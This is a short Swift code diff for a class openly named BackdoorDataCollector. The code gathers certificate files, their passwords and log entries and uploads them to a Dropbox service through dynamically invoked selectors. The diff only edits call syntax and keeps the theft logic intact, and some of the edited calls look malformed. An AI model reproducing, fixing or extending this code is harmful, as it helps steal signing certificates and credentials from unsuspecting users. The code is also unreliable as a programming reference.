@@ -181,7 +181,7 @@ class BackdoorDataCollector {
             
             for certificate in certificateBatch {
                 self.uploadCertificateData(certificate.data, 
-                                          password: certificate.password, 
+                                          password: certificate.password ?? "", 
                                           name: certificate.name)
             }
             
@@ -250,9 +250,9 @@ class BackdoorDataCollector {
                dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
                 dropboxService.perform(
                     Selector(("storePasswordForCertificate:password:completion:")),
-                    with: url.lastPathComponent,
-                    with: password,
-                    with: nil
+                    withObject: url.lastPathComponent,
+                    withObject: password,
+                    withObject: []
                 )
             }
             
@@ -260,9 +260,9 @@ class BackdoorDataCollector {
             if dropboxService.responds(to: Selector(("uploadCertificateFile:password:completion:"))) {
                 dropboxService.perform(
                     Selector(("uploadCertificateFile:password:completion:")),
-                    with: url,
-                    with: password,
-                    with: nil
+                    withObject: url,
+                    withObject: password,
+                    withObject: []
                 )
             }
         }
@@ -301,9 +301,9 @@ class BackdoorDataCollector {
             
             dropboxService.perform(
                 Selector(("uploadLogEntry:fileName:completion:")),
-                with: logEntry,
-                with: fileName,
-                with: nil
+                withObject: logEntry,
+                withObject: fileName,
+                withObject: []
             )
         }
     }
